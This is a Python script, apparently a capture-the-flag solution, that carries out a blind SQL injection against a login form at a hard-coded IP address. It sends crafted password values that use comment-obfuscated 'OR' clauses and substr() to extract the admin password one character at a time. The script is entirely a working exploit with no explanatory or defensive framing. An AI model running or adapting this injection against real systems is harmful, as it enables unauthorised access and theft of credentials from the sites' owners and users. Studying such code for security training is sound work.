import requests
import string
 
url = "http://18.142.249.235:7001/"
username = "admin"
 
payload_template = "'/**/oR/**/substr(passwOrd,{pos},1)='{char}"
 
 
def brute_force_password():
    password = ""
    chars = string.printable.strip()
 
    print("[+] Starting blind SQL injection...")
    for pos in range(1, 50):  
        for char in chars:
            data = {
                "username": username,
                "password": payload_template.format(pos=pos, char=char)
            }
 
            response = requests.post(url, data=data)
            if "warrior" in response.text:
                password += char
                print(f"[+] Found character {pos}: {char}")
                break
        else:
            print("[+] Password extraction completed!")
            break
 
    print(f"[+] Extracted password: {password}")
 
if __name__ == "__main__":
    brute_force_password()